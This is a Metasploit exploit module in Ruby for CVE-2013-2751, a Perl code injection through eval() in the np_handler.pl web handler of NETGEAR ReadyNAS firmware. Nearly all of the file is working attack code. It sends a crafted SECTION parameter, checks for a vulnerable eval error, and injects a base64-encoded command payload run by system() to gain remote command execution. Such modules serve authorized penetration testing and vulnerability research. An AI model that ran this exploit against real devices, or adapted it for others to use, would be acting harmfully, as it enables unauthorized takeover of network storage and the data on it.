# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;NETGEAR ReadyNAS Perl Code Evaluation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a Perl code injection on NETGEAR ReadyNAS 4.2.23 and 4.1.11. The
        vulnerability exists on the web fronted, specifically on the np_handler.pl component,
        due to the insecure usage of the eval() perl function. This module has been tested
        successfully on a NETGEAR ReadyNAS 4.2.23 Firmware emulated environment, not on real
        hardware.
      },
      &#039;Author&#039;         =>
        [
          &#039;Craig Young&#039;, # Vulnerability discovery
          &#039;hdm&#039;,          # diff the patch
          &#039;juan vazquez&#039;  # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-2751&#039; ],
          [ &#039;OSVDB&#039;, &#039;98826&#039; ],
          [ &#039;URL&#039;, &#039;http://www.tripwire.com/state-of-security/vulnerability-management/readynas-flaw-allows-root-access-unauthenticated-http-request/&#039; ],
          [ &#039;URL&#039;, &#039;http://www.tripwire.com/register/security-advisory-netgear-readynas/&#039; ]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 4096, # Has into account Apache request length and base64 ratio
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl telnet&#039;
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;NETGEAR ReadyNAS 4.2.23&#039;, { }]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jul 12 2013&#039;
      ))

    register_options(
      [
        Opt::RPORT(443)
      ], self.class)

  end

  def send_request_payload(payload)
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri("/np_handler", ""),
      &#039;vars_get&#039; => {
         &#039;PAGE&#039; =>&#039;Nasstate&#039;,
         &#039;OPERATION&#039; => &#039;get&#039;,
         &#039;SECTION&#039; => payload
      }
    })
    return res
  end

  def check
    res = send_request_payload(")")
    if res and res.code == 200 and res.body =~ /syntax error at \(eval/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    my_payload = "#{rand_text_numeric(1)});use MIME::Base64;system(decode_base64(\"#{Rex::Text.encode_base64(payload.encoded)}\")"
    print_status("#{peer} - Executing payload...")
    send_request_payload(my_payload)
  end

end

